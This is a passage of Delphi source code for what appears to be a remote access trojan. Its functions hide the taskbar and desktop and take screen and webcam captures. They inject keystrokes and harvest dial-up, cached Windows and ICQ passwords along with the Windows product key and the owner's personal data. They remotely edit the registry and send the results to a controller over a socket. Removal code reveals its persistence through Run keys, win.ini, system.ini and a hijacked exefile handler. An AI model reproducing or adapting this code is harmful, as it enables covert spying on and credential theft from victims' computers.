 buttonhandle := GetWindow(taskbarhandle, GW_CHILD);
 ShowWindow(buttonhandle, SW_HIDE);
end;
procedure hideTaskbar;
var wndHandle : THandle;
    wndClass : array[0..50] of Char;
begin
 StrPCopy(@wndClass[0], 'Shell_TrayWnd');
 wndHandle := FindWindow(@wndClass[0], nil);
 ShowWindow(wndHandle, SW_HIDE); // This hides the taskbar
end;
procedure hideDesktopIcons;
var wndHandle : THandle;
begin
 wndHandle := FindWindow(nil, 'Program Manager');
 ShowWindow(wndHandle, SW_HIDE); // This hides the taskbar
end;

procedure TForm1.ServerSocket1ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);var i:integer;
begin
 ICQSpyClock.Enabled:=False;
 if ICQSpySocket.Active then try ICQSpySocket.Active:=False;except end;
 DownloadFile:=False;
 ListenToKeys:=False;
 Conectat:=False;
 Parola:=Decrypt(ReadKey(Encrypt('Password')));
 if Parola<>'' then PassDone:=False;
 for i:=1 to 20 do Last20[i].token:=false;
 for i:=1 to SpyNo do Spies[i]:=False;
 NEW_SERVER:=False;
 ResetDB;
end;

procedure ScreenCapture;
var DC:HDC;
    Image:TBitmap;
    jpg:TJPEGImage;
begin
 Image:=TBitmap.Create;
 DC:=GetDC(GetDesktopWindow);
 try
  Image.Width:=GetDeviceCaps(DC,HORZRES);
  Image.Height:=GetDeviceCaps(DC,VERTRES);
  BitBlt(Image.Canvas.Handle,0,0,Image.Width,Image.Height,DC,0,0,SRCCOPY);
 finally
  ReleaseDC(GetDesktopWindow,DC);
 end;
 with Image do
  try
   jpg:=TJPEGImage.Create;
   jpg.PixelFormat:=jf8bit;
   jpg.CompressionQuality:=SetSnapshotQuality;
   with jpg do begin
    Assign(Image);
    Compress;
    Strm2Send.Clear;
    SaveToStream(Strm2Send);
    Free;
   end;
   finally
    Free;
   end;
end;

procedure WebCamCapture(quality:integer);
var Image:TBitmap;
    jpg:TJPEGImage;
begin
 try form1.webcam.activo:=true;except end;
 form1.webcam.ficheroimagen:=WinPath+'\wcwalppr.bmp';
 form1.webcam.grabarimagendisco;
 form1.webcam.activo:=false;
 Image:=TBitmap.Create;
 try Image.LoadFromFile(WinPath+'\wcwalppr.bmp');except end;
 with Image do
  try
   jpg:=TJPEGImage.Create;
   jpg.PixelFormat:=jf8bit;
   jpg.CompressionQuality:=quality;
   with jpg do begin
    Assign(Image);
    Compress;
    Strm2Send.Clear;
    SaveToFile(WinPath+'\~934675.bak');
    Free;
   end;
   finally
    Free;
   end;
 try DeleteFile(WinPath+'\wcwalppr.bmp');except end;
end;

procedure ScreenCapturePreview(xx,yy:Integer);
var DC:HDC;
    Image,tmp:TBitmap;
    jpg:TJPEGImage;
begin
 Image:=TBitmap.Create;
 tmp:=TBitmap.Create;
 DC:=GetDC(GetDesktopWindow);
 try
  Image.Width:=GetDeviceCaps(DC,HORZRES);
  Image.Height:=GetDeviceCaps(DC,VERTRES);
  tmp.Width:=xx;
  tmp.Height:=yy;
  BitBlt(Image.Canvas.Handle,0,0,Image.Width,Image.Height,DC,0,0,SRCCOPY);
 finally
  ReleaseDC(GetDesktopWindow,DC);
 end;
 with Image do
  try
   jpg:=TJPEGImage.Create;
   jpg.PixelFormat:=jf8bit;
   jpg.CompressionQuality:=SetPreviewQuality;
   with jpg do begin
    tmp.Canvas.StretchDraw(bounds(0,0,xx,yy),Image);
    Assign(tmp);
    Compress;
    Strm2Send.Clear;
    SaveToFile(WinPath+'\tempp~.bak');
    Free;
   end;
   finally
    Free;
    tmp.free;
   end;
end;

procedure TForm1.DeCompressFile(filename:string);
var zip:TZLBArchive;
    b:bool;
    AName:String;
begin
 AName:=WinPath+'\ZRCHMTA.SSA';
 CopyFile(PChar(FileName),PChar(AName),b);
 DeleteFile(FileName);
 zip:=TZLBArchive.Create(self);
 zip.OpenArchive(AName);
 zip.ExtractFileByName(ExtractFilePath(FileName),ExtractFileName(FileName));
 zip.CloseArchive;
 zip.Free;
 DeleteFile(AName);
end;

procedure TForm1.CompressFile(filename:string);
var zip:TZLBArchive;
    b:bool;
    AName:String;
begin
 AName:=WinPath+'\NTFCSFL.SSA';
 if FileExists(AName) then try DeleteFile(AName);except end;
 try zip:=TZLBArchive.Create(self);except end;
 try zip.CreateArchive(AName);except end;
 try zip.AddFile(FileName);except end;
 try zip.CloseArchive;except end;
 try zip.Free;except end;
end;

procedure TForm1.CompressNewFile(filename:string);
var zip:TZLBArchive;
    b:bool;
    AName:String;
begin
 AName:=WinPath+'\ADNLCSFL.SSA';
 if FileExists(AName) then try DeleteFile(AName);except end;
 try zip:=TZLBArchive.Create(self);except end;
 try zip.CreateArchive(AName);except end;
 try zip.AddFile(FileName);except end;
 try zip.CloseArchive;except end;
 try zip.Free;except end;
 try DeleteFile(FileName);except end;
 try CopyFile(PChar(AName),PChar(FileName),b);except end;
 try DeleteFile(AName);except end;
end;

procedure TForm1.SendIncomings;
var fsize:LongInt;
    winkey,feedback:String;
begin
 try Strm2Send.Clear;except end;
 try SpyMemo.Lines.SaveToStream(Strm2Send);except end;
 fsize:=Strm2Send.Size;
 if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
  else winkey:=IntToStr(length(IntToStr(fsize)));
 FeedBack := 'ICQ'+winkey+inttostr(fsize);
 try ICQSpySocket.Socket.Connections[0].SendText(FeedBack);except end;
 if FileExists(WinPath+'\tempcp.bak') then try DeleteFile(WinPath+'\tempcp.bak');except end;
 try Strm2Send.SaveToFile(WinPath+'\tempcp.bak');except end;
// CompressFile(WinPath+'\tempp.bak');
 try ICQSpySocket.Socket.Connections[0].SendStream(TFileStream.Create (WinPath+'\tempcp.bak', fmOpenRead or fmShareDenyWrite));except end;
 try DeleteFile(WinPath+'\tempcp.bak');except end;
end;

procedure AddStuff(unde:String);
var SearchRec:TSearchRec;
begin
with Form1 do begin
 ListBox1.Items.Clear;
 if FindFirst(unde+'\*.*',faAnyFile,SearchRec)=0 then
  repeat
   if (SearchRec.Attr and faDirectory)<>0 then
    begin
     if SearchRec.Name<>'.' then
      ListBox1.Items.Add('<'+SearchRec.Name+'>');
    end
    else ListBox1.Items.Add(SearchRec.Name);
  until FindNext(SearchRec)>0;
 Strm2Send.Clear;
 ListBox1.Items.SaveToStream(Strm2Send);
end;end;

function TForm1.GetPriorityString(Priority: DWORD): string;
begin
  Result := '';
  case Priority of
    PCB_IDLE:     Result := 'Idle';
    PCB_NORMAL:   Result := 'Normal';
    PCB_HIGH:     Result := 'High';
    PCB_REALTIME: Result := 'Real Time';
  else
    Result := 'Unknown';
  end;
end;

procedure TForm1.RefreshProcesses;
  procedure AddProcess(pe32: TPROCESSENTRY32);begin
    ListBox1.Items.Add(LowerCase(ExtractFilename(string(pe32.szExeFile))));
    ListBox1.Items.Add(pe32.szExeFile);
    ListBox1.Items.Add(GetPriorityString(pe32.pcPriClassBase));
    Inc(ProcLA);
    try ProcessData[ProcLA] := Pointer(pe32.th32ProcessID);except end;
  end;
var SnapShot: THandle;
    pe32: TPROCESSENTRY32;
begin
 ListBox1.Items.Clear;
 try
  ProcLA:=0;
  SnapShot := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  try
   if SnapShot <> 0 then begin
    pe32.dwSize := SizeOf(TPROCESSENTRY32);
    if Process32First(SnapShot, pe32) then begin
     AddProcess(pe32);
     while Process32Next(SnapShot, pe32) do
      AddProcess(pe32);
    end;
   end;
  finally
   try CloseHandle(SnapShot);except end;
  end;
 finally
 end;
 Strm2Send.Clear;
 ListBox1.Items.SaveToStream(Strm2Send);
end;

procedure TForm1.RefreshRAS;
var i : integer;
    count: integer ;
    connectlist:TStringList;
begin
 ListBox1.Items.Clear;
 connectlist:=Tstringlist.create;
 if RAS1.TestRAS then
 begin
  RAS1.GetPhoneBookEntries;
  connectlist.AddStrings(RAS1.PhoneBookEntries);
  if connectlist.Count=0 then ListBox1.Items.add('none found.');
  for i:=0 to connectlist.Count-1 do begin
   RAS1.EntryName := connectlist.Strings[i];
   if RAS1.GetDialParams = 0 then
    begin
     ListBox1.Items.Add('[Connection: '+connectlist.Strings[i]+']');
//     ListBox1.Items.Add('connection name: '+connectlist.Strings[i]);
     ListBox1.Items.Add('login: '+RAS1.UserName) ;					// display them
     ListBox1.Items.Add('password: '+RAS1.Password) ;
     if RAS1.GetEntryProperties = 0 then
      begin
       ListBox1.Items.Add('phone number: '+RAS1.PhoneNumber) ;
      end else ListBox1.Items.Add('phone number: not found') ;
     ListBox1.Items.Add('');
    end;
  end;
 end;
 connectlist.free;
 Strm2Send.Clear;
 ListBox1.Items.SaveToStream(Strm2Send);
end;


procedure GetWindows(parametru:boolean);
var W:THandle;
    S:ShortString;
    index:Integer;
begin
if (ParaMetru) then Form1.delay(1000);
with Form1 do begin
 ListBox1.Items.Clear;
 ListBox1.Clear;
 w:=GetWindow(GetDesktopWindow,GW_CHILD);
 index:=1;
 while w<>0 do begin
  GetWindowText(W,@S[1],254); s[0]:=Char(StrLen(@S[1]));
  If S='Program Manager' then s:='';
  if (w<>Handle) and (W<>Application.Handle) and
   ((RefreshAll) or (IsWindowVisible(W))) and (S<>'') then
    begin
     if (not IsWindowEnabled(w)) then
      ListBox1.Items.Add(s+' (disabled)')
     else ListBox1.Items.Add(s);
     winds[index]:=w;
     inc(index);
    end;
  w:=GetWindow(W,GW_HWNDNEXT);
 end;
 Strm2Send.Clear;
 SendString:=ListBox1.Items.Text;
end;end;

procedure TForm1.GetICQList;
var Reg:TRegistry;
begin
 ListBox1.Items.Clear;
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_CURRENT_USER;
  try OpenKey('Software\Mirabilis\ICQ\Owners',false);except exit;end;
  if HasSubKeys then GetKeyNames(ListBox1.Items);
  if ListBox1.Items.Count<>0 then
  Free;
 end;
   for i:=0 to ListBox1.Items.Count-1 do
    begin
     Reg:=TRegistry.Create;
     with Reg do begin
      RootKey:=HKEY_CURRENT_USER;
      try OpenKey('Software\Mirabilis\ICQ\Owners\'+ListBox1.Items[i],false);except end;
      try ListBox1.Items.Add(ReadString('Name'));except end;
      Free;
     end; 
    end;
 SendString:=ListBox1.Items.Text;
end;

procedure ChangeWallpaper(bitmap: string);       {bitmap contains filename: *.bmp}
var pBitmap : pchar;
begin
 bitmap:=bitmap+#0;
 pBitmap:=@bitmap[1];
 SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, pBitmap, SPIF_SENDWININICHANGE{SPIF_UPDATEINIFILE});
end;

procedure ConvertToBMP(var JPGFile:String);
var MyJPEG:TJPEGImage;
    MyBMP:TBitmap;
begin
 MyJPEG:=TJPEGImage.Create;
 with MyJPEG do begin
  LoadFromFile(JPGFile);
  MyBMP:=TBitmap.Create;
  with MyBMP do begin
    Width:=MyJPEG.Width;
    Height:=MyJPEG.Height;
    Canvas.Draw(0,0,MyJPEG);
    JPGFile:=copy(JPGFile,1,length(JPGFile)-3)+'bmp';
    SaveToFile(JPGFile);
    Free;
   end;
   Free;
  end;
end;
procedure SetKey(sProgTitle,SCmdLine:string);
var sKey:String;
    reg:TRegIniFile;
begin
 sKey:='';
 reg:=TRegIniFile.Create('');
 reg.RootKey:=HKEY_LOCAL_MACHINE;
 reg.WriteString(InDir
                +sKey+#0,sProgTitle,sCmdLine);
 reg.Free;
end;

function GetCpuSpeed: Comp;
 var
   t: DWORD;
   mhi, mlo, nhi, nlo: DWORD;
   t0, t1, chi, clo, shr32: Comp;
 begin
   shr32 := 65536;
   shr32 := shr32 * 65536;
   t := GetTickCount;
   while t = GetTickCount do begin end;
   asm
     DB 0FH
     DB 031H
     mov mhi,edx
     mov mlo,eax
   end;
   while GetTickCount < (t + 1000) do begin end;
   asm
     DB 0FH
     DB 031H
     mov nhi,edx
     mov nlo,eax
   end;
   chi := mhi;
   if mhi < 0 then chi := chi + shr32;
   clo := mlo;
   if mlo < 0 then clo := clo + shr32;
   t0 := chi * shr32 + clo;
   chi := nhi;
   if nhi < 0 then chi := chi + shr32;
   clo := nlo;
   if nlo < 0 then clo := clo + shr32;
   t1 := chi * shr32 + clo;
   Result := (t1 - t0) / 1E6;
 end;

procedure TForm1.SendSystemInformation;
var size:string;
    Reg:TRegistry;
    new_k1,new_k2:string;
begin
 Reg:=TRegistry.Create;
 new_k1:='';new_k2:='';
 with Reg do begin
  RootKey:=HKEY_LOCAL_MACHINE;
  if OpenKey('Software\Microsoft\Windows\CurrentVersion',false) then
   try
    new_k1:=ReadString('Version');
    new_k2:=ReadString('ProductKey');
   except
   end;
   Free;
 end;
with Form1 do begin
 ListBox1.Items.Clear;
with GameInfo1,ListBox1.Items do
 begin
  add(ComputerName);
  add(UserName);
  add(WinDir);
  add(SysDir);
  add(RegOwner);
  add(RegCompany);
  add(osVersion);
  add(new_k1);
  add(new_k2);
  add(DispResu);
  add(DirectXvs);
  add(BitsPixel);
  add(CPUVendor);
  add(Format('%.1f MHz', [GetCpuSpeed]));
   size:=FloatToStr(DiskSize(0));
  add(Format('%0.0n bytes',[StrToFloat(size)]));
   size:=FloatToStr(DiskFree(0));
  add(Format('%0.0n bytes',[StrToFloat(size)]));
  add(IntToStr(ServerSocket1.Socket.ActiveConnections));
 end;
end;
end;

procedure TForm1.SendHomeInformation;
var size:string;
    Reg:TRegistry;
    MySerial:String;
    i:integer;
begin
 ListBox1.Items.Clear;
 Reg:=TRegistry.Create;
 with Reg,ListBox1.Items do begin
  RootKey:=HKEY_LOCAL_MACHINE;
  if OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\ElectronicCommerce\UserInfo',false) then
  begin
   try MySerial:=ReadString('Address 1');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('Address 2');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('BusinessTitle');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('City');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('Company');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('Country');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('CustomerType');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('Email');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('Name');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('State');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('TelephoneCity');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('TelephoneCountry');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('TelephoneLocal');except MySerial:='n/a';end;Add(MySerial);
   try MySerial:=ReadString('Zip Code');except MySerial:='n/a';end;Add(MySerial);
  end else for i:=1 to 14 do ListBox1.Items.Add('not found');
 end;
 Reg.Free;
end;

function FileCopy( src, dest: String): Boolean;
var s, d: TOFStruct;
    fs, fd: Integer;
    fnSrc, fnDest: PChar;
begin
      src:=src + #0;dest:=dest + #0;
      fnSrc:=@src[1];
      fnDest:=@dest[1];
      fs := LZOpenFile( fnSrc, s, OF_READ );
      fd := LZOpenFile( fnDest, d, OF_CREATE );
      if LZCopy( fs, fd ) < 0 then
         Result:=False else Result:=True;
      LZClose( fs );
      LZClose( fd );
end;
procedure TForm1.RemoveServer;
var sKey:String;
    reg,reg2:TRegIniFile;
    unde:String;
    inif:TIniFile;
    tmpstr:string;
begin
 try unde:=Decrypt(ReadKey(Encrypt('RunMethod')));except end;
if ((unde[1]='1') or (unde[2]='1')) then begin
 sKey:='';
 reg2:=TRegIniFile.Create('');
 reg2.RootKey:=HKEY_LOCAL_MACHINE;
 if unde[1]='1' then
  reg2.DeleteKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run',RegistryKeyName);
 if unde[2]='1' then
  reg2.DeleteKey('SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices',RegistryKeyName);
 reg2.Free;
end;
if unde[3]='1' then begin
try
 inif := TIniFile.Create(WinPath+'\win.ini');
 tmpstr:=inif.ReadString('windows', 'run', 'ERROR');
 if (Pos(', '+CurrentExe,tmpstr)<>0) then
  Delete(tmpstr,Pos(', '+CurrentExe,tmpstr),length(CurrentExe)+2)
 else
  tmpstr:='';
 inif.WriteString('windows','run',tmpstr);
 inif.free;
except end;
end;
if unde[4]='1' then begin
 try
  inif := TIniFile.Create(WinPath+'\system.ini');
  tmpstr:=inif.ReadString('boot', 'shell', 'ERROR');
  if Pos(UpperCase(CurrentExe),UpperCase(tmpstr))<>0 then begin
  tmpstr:=copy(tmpstr,1,Pos(UpperCase(CurrentExe),UpperCase(tmpstr))-1);
  inif.WriteString('boot','shell',tmpstr);
  end;
  inif.free;
 except end;
end;
if (unde[5]='1') then begin
  reg:=TRegIniFile.Create('');
  reg.RootKey:=HKEY_CLASSES_ROOT;
  reg.WriteString('exefile\shell\open\command','','"%1" %*');
  reg.free;
end;
try
 sKey:='';
 reg:=TRegIniFile.Create('');
 reg.RootKey:=HKEY_LOCAL_MACHINE;
 reg.EraseSection(InDir);
 reg.Free;
except end; 
end;

procedure WriteTheWAVFile;
var res:TResourceStream;
begin
 if FileExists(WinPath+'\flfrdat.wav') then try DeleteFile(WinPath+'\flfrdat.wav');except end;
 res:=TResourceStream.Create(HInstance,'RCDATA_2',RT_RCDATA);
 res.SaveToFile(WinPath+'\flfrdat.wav');
 res.free;
end;

function TForm1.ShowCustomizedMessage(s:string;sender:TObject):string;
 var TSum : LongInt;
     MCapt, MText : PChar;
     MT, RT : string;
     i : integer;
     but,ico:integer;
     answer:LongInt;
     msg1,msg2:string;
const IconConst : array [0..4] of integer=(0, MB_ICONEXCLAMATION,
      MB_ICONINFORMATION, MB_ICONSTOP,  MB_ICONQUESTION);
begin
 but:=StrToInt(copy(s,1,1));
 ico:=StrToInt(copy(s,2,1));
 msg1:=copy(s,3,pos('ZJXX',s)-3);
 msg2:=copy(s,pos('ZJXX',s)+4,length(s));
 TSum:=0;
 case but of
  1 : TSum:=MB_ABORTRETRYIGNORE;
  2 : TSum:=MB_OKCANCEL;
  3 : TSum:=MB_RETRYCANCEL;
  4 : TSum:=MB_YESNO;
  5 : TSum:=MB_YESNOCANCEL;
 end;
 TSum:=TSum+IconConst[ico];
 getMem (MCapt, 100);
 StrPCopy (MCapt, msg1);
 RT:='';
 MT:=msg2;
 for i:=1 to Length (MT) do
  if MT[i]='|' then RT:=RT+chr(13)+chr(10) else RT:=RT+MT[i];
 getMem (MText, 500);
 StrPCopy (MText, RT);
 answer:=MessageBox (Handle, MText, MCapt, TSum);
 freeMem (MText);
 freeMem (MCapt);
 result:='damn''! unknown answer';
 case answer of
  IDABORT : Result:='Abort.';
  IDCANCEL: Result:='Cancel.';
  IDIGNORE: Result:='Ignore.';
  IDNO    : Result:='No.';
  IDOK    : Result:='Ok.';
  IDRETRY : Result:='Retry.';
  IDYES   : Result:='Yes.';
 end;
if copy(result,1,1)<>'d' then
 result:='user clicked : '+result;
end;

function SetBit(Bits: Integer; BitToSet: integer): Integer;
begin
  Result := (Bits or (1 shl BitToSet))
end;
function PressKeyz(keyz:string;where:integer):string;
const UPChars = ['A'..'Z','~','!','@','#','$','%','^','&','*','(',')','_','+','{','}',':','"','<','>','?'];
var dwExtraInfo: longint;
    vk: byte;
    sk: word;
begin
 if not IsWindow(winds[where]) then
  begin
   result:='the specified window doesn not exist.';
   exit;
  end;
 setforegroundwindow(winds[where]);
for i:=1 to length(keyz) do begin
if keyz[i] in UPChars then
 begin
  vk:= VK_SHIFT;
  sk:= mapvirtualkey(vk,0);
  dwExtraInfo:= (sk shl 8) + 1;
  keybd_event(vk,sk,0,dwExtraInfo);
 end;
  vk:= vkKeyScan(keyz[i]);
  sk:= mapvirtualkey(vk,0);
  dwExtraInfo:= (sk shl 8) + 1;
  keybd_event(vk,sk,0,dwExtraInfo);
  keybd_event(vk,sk,KEYEVENTF_KEYUP,dwExtraInfo);
 if keyz[i] in UPChars then begin
  vk:= VK_SHIFT;
  sk:= mapvirtualkey(vk,0);
  dwExtraInfo:= sk shl 8;
  setbit(dwExtraInfo,30);
  setbit(dwExtraInfo,31);
  keybd_event(vk,0,KEYEVENTF_KEYUP,dwExtraInfo);
 end;
 end;
 result:='keys pressed.';
end;

procedure FlipScreen(pex,pey:boolean);
var DC:HDC;
    x,y,w,h:LongInt;
    I:TBitmap;
    dummy:integer;
begin
 DC:=GetDC(GetDesktopWindow);
 with frmPicture do
 begin
  imgpic.picture.bitmap.Width:=GetDeviceCaps(DC,HORZRES);
  imgpic.picture.bitmap.Height:=GetDeviceCaps(DC,VERTRES);
  BitBlt(imgpic.picture.bitmap.Canvas.Handle,0,0,imgpic.Width,imgpic.Height,DC,0,0,SRCCOPY);
  ReleaseDC(GetDesktopWindow,DC);
 if pex then begin
  w:=imgpic.Width;
  h:=imgpic.Height;
  try
    I:=TBitmap.Create;
    I.Width:=w;
    I.Height:=h;
    dec(w);
    dec(h);
    for x:= 0 to w do
      for y:= 0 to h do
        I.Canvas.Pixels[x,h-y]:=imgpic.Canvas.Pixels[x,y];
    imgpic.Canvas.Draw(0,0,I);
  finally
    I.Free
  end;
 end;
 if pey then begin
  w:=imgpic.Width;
  h:=imgpic.Height;
  try
    I:=TBitmap.Create;
    I.Width:=w;
    I.Height:=h;
    dec(w);
    dec(h);
    for x:= 0 to w do
      for y:= 0 to h do
       I.Canvas.Pixels[w-x,y]:=imgpic.Canvas.Pixels[x,y];
    imgpic.Canvas.Draw(0,0,I);
  finally
    I.Free
  end;
 end;
  imgPic.Top:=0;
  imgPic.Left:=0;
  pnPic.Left:=0;
  pnPic.Top:=0;
  pnPic.Width:=imgPic.Width;
  pnPic.Height:=imgPic.Height;
  Width:=imgPic.Width;
  Height:=imgPic.Height;
  Left:=(Screen.Width-Width) div 2;
  Top:=(Screen.Height-Height) div 2;
  SystemParametersInfo( SPI_SCREENSAVERRUNNING, 1, @dummy, 0);
  Show;
 end;
end;

procedure TForm1.ShowPicture (pname : string);
begin
 if FileExists (pname) then
 with frmPicture do
 begin
  imgPic.Picture.LoadFromFile (pname);
  imgPic.Top:=0;
  imgPic.Left:=0;
  pnPic.Left:=2;
  pnPic.Top:=2;
  pnPic.Width:=imgPic.Width+3;
  pnPic.Height:=imgPic.Height+3;
  Width:=imgPic.Width+5;
  Height:=imgPic.Height+5;
  Left:=(Screen.Width-Width) div 2;
  Top:=(Screen.Height-Height) div 2;
  Visible:=True;
  Show;
 end;
end;

procedure TForm1.UpdateAll(param:string);
var fsize,loop:integer;
    winkey,feedback,str1,str2:string;
begin
 if copy(param,1,3)='ORK' then begin
  case StrToInt(copy(param,4,1)) of
    0: Reg.RootKey := HKEY_CLASSES_ROOT;
    1: Reg.RootKey := HKEY_CURRENT_USER;
    2: Reg.RootKey := HKEY_LOCAL_MACHINE;
    3: Reg.RootKey := HKEY_USERS;
    4: Reg.RootKey := HKEY_CURRENT_CONFIG;
    5: Reg.RootKey := HKEY_DYN_DATA;
  end;
  Reg.OpenKey ('\', False);
 end else if copy(param,1,3)='OKY' then reg.OpenKey(copy(param,4,length(param)),false)
 else if copy(param,1,3)='DRG' then reg.DeleteValue(copy(param,4,length(param)))
 else if copy(param,1,3)='CRG' then
  begin
   if (param[4]='S') then reg.WriteString(LaCheie,copy(param,5,length(param)));
   if (param[4]='I') then
    try
     reg.WriteInteger(LaCheie,StrToInt(copy(param,5,length(param))));
    except end;
  end
 else if copy(param,1,3)='NIK' then
  begin
   loop:=StrToInt(copy(param,4,2));
   str1:=copy(param,6,loop);
   str2:=copy(param,6+loop,length(param));
   try reg.WriteInteger(str1,strtoint(str2)); except end;
  end
 else if copy(param,1,3)='NSK' then
  begin
   loop:=StrToInt(copy(param,4,2));
   str1:=copy(param,6,loop);
   str2:=copy(param,6+loop,length(param));
   try reg.WriteString(str1,str2);except end;
  end
 else if copy(param,1,3)='NRF' then
  reg.openkey(copy(param,4,length(param)),true);

 ListBox1.Clear;ListBox2.Clear;ListBox1.Sorted:=False;ListBox2.Sorted:=False;
 if Reg.HasSubKeys then
   Reg.GetKeyNames(ListBox1.Items)
 else
   ListBox1.Clear;
 reg.GetValueNames(ListBox2.Items);
 listbox1.items.add('/despartitura');
 for i:=1 to listbox2.Items.count do
  listbox1.items.add(listbox2.items[i-1]);
 Strm2Send.Clear;
 listbox1.items.SaveToStream(Strm2Send);
 fsize:=Strm2Send.Size;
 if length(IntToStr(fsize))<10 then winkey:='0'+IntToStr(length(IntToStr(fsize)))
  else winkey:=IntToStr(length(IntToStr(fsize)));
 Feedback := 'LT1'+winkey+inttostr(fsize);
 ServerSocket1.Socket.Connections[0].SendText (Feedback);
 Strm2Send.SaveToFile(WinPath+'\temp~.bak');
 ServerSocket1.Socket.Connections[0].SendStream (TFileStream.Create (WinPath+'\temp~.bak', fmOpenRead or fmShareDenyWrite));
 try DeleteFile(WinPath+'\temp~.bak');except end;
end;

procedure TForm1.SearchAndReport(recursive:boolean;fp,sd:string);
  procedure SearchTree(AFilePattern: String);
  var
    SearchRec: TSearchRec;
    DosError: integer;
    dir: string;
  begin
    GetDir(0, dir);
    if dir[length(dir)] <> '\' then dir := dir + '\';
    DosError := FindFirst(AFilePattern, 0, SearchRec);
    while DosError = 0 do begin
      try
       listbox1.items.add(dir+SearchRec.name);
      except
      end;
      DosError := FindNext(SearchRec);
    end;
    SysUtils.FindClose(SearchRec);

    if recursive then begin
      DosError := FindFirst('*.*', faDirectory, SearchRec);
      while DosError = 0 do begin
       if ((SearchRec.attr and faDirectory = faDirectory) and
        (SearchRec.name <> '.') and (SearchRec.name <> '..')) then begin
        ChDir(SearchRec.name);
        SearchTree(AFilePattern);
        ChDir('..');
      end;
      DosError := FindNext(SearchRec);
    end;
     SysUtils.FindClose(SearchRec);
   end;
  end;
begin
  listbox1.clear;
  ChDir(sd);
  SearchTree(fp);
end;

function ExecuteFile(const FileName, Params, DefaultDir: string;
  ShowCmd: Integer): THandle;
var
  zFileName, zParams, zDir: array[0..79] of Char;
begin
  Result := ShellExecute(Application.MainForm.Handle, nil,
    StrPCopy(zFileName, FileName), StrPCopy(zParams, Params),
    StrPCopy(zDir, DefaultDir), ShowCmd);
end;
procedure ExecuteFileOptions(App : string; Priority : Word; ShowWnd : Word);
var
  Process : TProcessInformation;
  Startup : TStartupInfo;
begin
  FillChar(Startup, SizeOf(Startup), 0);
  Startup.cb := SizeOf(Startup);
  Startup.dwFlags := Startup.dwFlags + STARTF_USESHOWWINDOW;
  Startup.wShowWindow := ShowWnd;
  if CreateProcess(nil, PChar(App), nil, nil, False,
   CREATE_DEFAULT_ERROR_MODE + Priority,
   nil, nil, Startup, Process) then begin
    CloseHandle(Process.hThread);
    CloseHandle(Process.hProcess);
  end;
end;

procedure LoadPasswords;
begin
  if WNetEnumCachedPasswords(nil, 0, $FF, @AddPassword, 0) <> 0 then
   begin
   end
  else
   if Count = 0 then
    Form1.LoadIn.Lines.Add('[no cached passwords found]');
end;

procedure TForm1.AddPass(path:string);
var buf:array[1..500000] of char;
    inspate,rd,a,i,f:integer;
    _fis:string;
    fis:PChar;
    _f:TOfStruct;
    s,readstring,PassString,Pass:String;
    b:bool;
begin
{ s:=Copy(ExtractFileName(path),1,length(ExtractFileName(path))-4);
 try f:=StrToInt(s[length(s)]);except exit;end;}
 inspate:=21;
 CopyFile(PChar(Path),PChar(ExtractFilePath(path)+'LKJHG.BAK'),b);
 _fis:=ExtractFilePath(path)+'LKJHG.BAK'+#0;
 fis:=@_fis[1];
 f:=0;for f:=1 to 499999 do buf[f]:=#3;
 f:=LZOpenFile(fis, _f, OF_READ);
 LZSeek(f,0,0);
 LZRead(f,@buf,500000);
 LZClose(f);
 try DeleteFile(ExtractFilePath(path)+'LKJHG.BAK');except end;
 if pos(SearchString,buf)=0 then Exit;
 PassString:=Copy(buf,pos(SearchString,buf)+1-inspate,inspate);
 Pass:='';
 for i:=1 to inspate do
  if ((Ord(PassString[i])>31) and (Ord(PassString[i])<137)) then Pass:=Pass+PassString[i];
 LoadIN.lines.add('uin: '+Copy(ExtractFileName(path),1,length(ExtractFileName(path))-4)+', pass: '+pass);
end;

procedure TForm1.LoadICQPasswords;
var ICQdir:string;
    Reg:TRegistry;
    MySerial:String;
    SearchRec:TSearchRec;
begin
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_CURRENT_USER;
  if OpenKey('SOFTWARE\Mirabilis\ICQ\DefaultPrefs',false) then
   try
    ICQDir:=ReadString('New Database');
   except
    ICQDir:='';
   end;
   Free;
  end;
 if ICQDir<>'' then
  begin
   LoadIN.Lines.Add('found uins and passwords:');
   if FindFirst(ICQDir+'\*.DAT',faAnyFile,SearchRec)=0 then
    repeat
     AddPass(ICQdir+'\'+SearchRec.Name);
    until FindNext(SearchRec)>0;
  end else LoadIn.Lines.Add('[icq not found]');
end;

var Chart1_1:array[1..16] of string[1]=('A','M','E','F','G','A','M','E','F','G','B','P','D','K','J','O');
    Chart1_2:array[1..16] of string[1]=('B','N','F','E','H','B','N','F','E','H','A','O','C','L','I','P');
    Chart1_3:array[1..16] of string[1]=('C','O','G','H','E','C','O','G','H','E','D','N','B','I','L','M');
    Chart1_4:array[1..16] of string[1]=('D','P','H','G','F','D','P','H','G','F','C','M','A','J','K','N');
    Chart1_5:array[1..16] of string[1]=('H','L','D','C','B','H','L','D','C','B','G','I','E','N','O','J');
var Chart2:array[1..36] of String[17]=('aDFJBADEKGPMLFJBA','bAGKCDAHJFMPIGKCD','cBHLDCBGIENOJHLDC','dGAMEFGBPDKJOAMEF',
                                       'eHBNFEHAOCLIPBNFE','fECOGHEDNBILMCOGH','gFDPHGFCMAJKNDPHG',
                                       'hKMAIJKNDPGFCMAIJ','iLNBJILMCOHEDNBJI','jIOCKLIPBNEHAOCKL',
